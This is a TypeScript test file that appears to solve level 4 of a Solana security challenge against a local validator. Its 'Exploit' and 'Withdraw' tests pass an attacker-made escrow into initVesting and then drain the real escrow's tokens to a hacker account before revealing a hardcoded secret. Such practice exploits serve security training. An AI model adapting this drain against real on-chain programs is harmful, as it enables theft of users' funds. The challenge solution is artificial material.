import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';
import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, createAssociatedTokenAccount, getAssociatedTokenAddressSync, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")


// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v


const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"


// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const evilEscrowKeys = load_keypair('../accounts/evil.json');
  const recipient =  web3.Keypair.generate();
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;

  let escrowPdaAuthority: any;
  let HACKER_ATA: any
  let EVIL_ESCROW_ATA: any


  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, evilEscrowKeys.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);

    const hackerAta = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      hacker,
      USDC,
      hacker.publicKey,
      false,
      'confirmed',
      null,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
      )
    await new Promise(resolve => setTimeout(resolve, 2000));
    const hackerAtaPubKey = new web3.PublicKey(hackerAta.address)
    console.log(`Hacker ATA -> ${hackerAtaPubKey}`)
    HACKER_ATA = hackerAtaPubKey

    const evilEscrowATA = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      hacker,
      USDC,
      evilEscrowKeys.publicKey,
      false,
      'confirmed',
      null,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
      )
    await new Promise(resolve => setTimeout(resolve, 10000));
    const evilEscrowATAPubKey = new web3.PublicKey(evilEscrowATA.address)
    console.log(`Evil Escrow ATA -> ${evilEscrowATAPubKey}`)
    EVIL_ESCROW_ATA = evilEscrowATAPubKey


    const hackerAtaInfo = await provider.connection.getAccountInfo(HACKER_ATA);
    const evilEscrowAtaInfo = await provider.connection.getAccountInfo(EVIL_ESCROW_ATA);

  });


  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v

  it("Exploit", async () => {

    const hack = await program.methods.initVesting(
      recipient.publicKey, //recipient
      new anchor.BN ('1000'), //amount
      new anchor.BN ('0'), //start_at
      new anchor.BN ('1'), //end_at
      new anchor.BN ('1') //interval
    )
    .accounts({
      sender: hacker.publicKey,
      senderTokenAccount: HACKER_ATA,
      escrow: evilEscrowKeys.publicKey,
      escrowTokenAccount: EVIL_ESCROW_ATA,
      mint: USDC,
      tokenProgram: TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId,
    })
    .signers([hacker, evilEscrowKeys])
    .rpc();

  });

  it("Inspect escrow", async () => {  
    const escrow = await program.account.escrow.fetch(ESCROW);
    console.log(escrow);
  });

  it ("Withdraw", async () => {
    const withdraw = await program.methods.withdrawUnlocked()
    .accounts({
      recipient: hacker.publicKey,
      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
      escrow: ESCROW,
      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
      escrowPdaAuthority: escrowPdaAuthority,
      mint: USDC,
      tokenProgram: TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId
    })
    .signers([hacker])
    .rpc()
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(withdraw);

  })



  it("Reveals secrets", async () => {

    const reveal = await program.methods.revealSecret(SECRET)
    .accounts({
      hacker: hacker.publicKey,
      hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
      mint: USDC
    }
    )
    .signers([hacker])
    .rpc();
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(reveal);

  });


  // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE ABOVE
  // | | | | | | | | | | | | | | | | | | | | |
  // x x x x x x x x x x x x x x x x x x x x x


  // it("Bug evaluation", async () => {


  //   await program.methods.revealSecret(SECRET)
  //   .accounts({
  //     hacker: hacker.publicKey,
  //     hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
  //     mint: USDC
  //   }
  //   )
  //   .signers([hacker])
  //   .rpc({ commitment: "confirmed" });

  // });

});


async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
